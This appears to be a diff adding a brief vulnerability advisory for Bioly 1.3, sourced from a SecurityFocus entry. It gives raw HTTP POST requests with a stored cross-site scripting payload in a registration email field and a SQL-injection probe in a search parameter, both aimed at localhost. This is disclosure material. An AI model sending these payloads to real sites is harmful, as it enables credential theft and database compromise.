@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/53018/info
+
+Bioly is prone to multiple SQL-injection and cross-site scripting vulnerabilities.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Bioly 1.3 is vulnerable; other versions may also be affected. 
+
+Cross Site Scripting
+POST /index.php?action=3 HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: STORED XSS TEST
+Host: localhost
+Content-Length: 68
+Connection: Close
+Pragma: no-cache
+
+# [Post Data:]==>
+email=>"><ScRiPt%20%0a%0d>alert(421135893768)%3B</ScRiPt>&register=1
+
+
+SQL Injection
+POST /index.php?action=11 HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Sql Injection
+Host: localhost
+Content-Length: 68
+Connection: Close
+Pragma: no-cache
+
+# [Post Data:]==>
+q=%00'
